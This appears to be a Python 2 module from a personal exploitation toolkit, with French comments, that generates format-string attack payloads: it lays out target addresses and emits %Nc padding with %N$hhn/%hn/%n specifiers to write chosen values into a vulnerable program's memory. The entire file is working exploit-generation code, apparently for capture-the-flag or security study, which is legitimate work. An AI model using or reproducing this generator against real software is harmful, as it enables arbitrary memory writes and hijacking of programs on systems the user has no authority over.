#!/usr/bin/python2
# coding: utf-8

# DEPANNAGE TEMPORAIRE A NE PAS UTILISER SINON....

# TODO: Rewrite from scratch & use exception (qui a code un truc aussi moche et ca n'utilise pas la version actuelle de la lib...)
# TODO: Gestion envoie de texte
# TODO: Gestion de l'ajustement et du prefix
# TODO: Gestion des caracteres interdits ('\0', '\n' ...)
# TODO: Gestion des relocations (avant, apres, milieu)
# TODO: Gestion par paquets (multiples addr/valeur)
# TODO: Gestion de l'ecriture de taille differente
# TODO: Gestion du 64 bits

# TODO params:
# @array: addr - value - taille a ecrire - par groupe de combien
# @bits: 32 | 64
# @off: initial offset

import holypy.core.memory      as memory
from   holypy.core.convert     import itos, stoi, stob
from   holypy.core.iter        import split
from   holypy.core.output      import pperr as perror

################################################################################
### Constants
################################################################################

SIZE      = {
    32: {"i": 4, "s": "I"},
    64: {"i": 8, "s": "Q"},
}
MODIFIERS = {
    1: "hh",
    2: "h",
    4: "",
    8: "l",
}

################################################################################
### Methods
################################################################################

def payload(address, value, index, bits = 32, size = 2, endian = True, raw = True):
    """
    Generation d'un payload format string
    """
    if not bits in SIZE.keys():
        perror("[-] Format: @bits must be either 32 or 64")
        return ""
    if not size in MODIFIERS.keys():
        perror("[-] Format: @size must be either 1, 2, 4 or 8")
        return ""
    if size > SIZE[bits]["i"]:
        perror("[-] Format: @size must be lower than @bits")
        return ""
    count   = 0
    chunks  = _split(address, value, bits, size, endian)
    payload = ""
    for i, chunk in enumerate(chunks):
        payload   += stob(chunk["a"]) if not raw else chunk["a"]
        count     += SIZE[bits]["i"]
        chunk["i"] = i
    for i, chunk in enumerate(chunks):
        offset = stoi(chunk["v"]) - count
        if offset > 0:
            payload += "%%%dc" % offset
        elif offset < 0:
            perror("[-] Format: invalid offset")
            return
        payload += "%%%d$%sn" % (index + chunk["i"], MODIFIERS[size])
        count   += offset
    return payload

def _split(address, value, bits, size, endian):
    """
    Creation des differentes partie du payload
    """
    parts = []
    value = _format(value, bits, endian)
    for i, v in enumerate(split(value, size)):
        parts.append({
            "a": _format(address + i * size, bits, endian),
            "v": v[::-1] if endian else v,
            "i": -1,
        })
    return sorted(parts, key = lambda x: x["v"])

def _format(value, bits, endian):
    """
    Formate @value pour etre ecrit en memoire
    """
    value = memory.endian(value, SIZE[bits]["s"]) if endian else value
    return itos(value).rjust(SIZE[bits]["i"], "\x00")
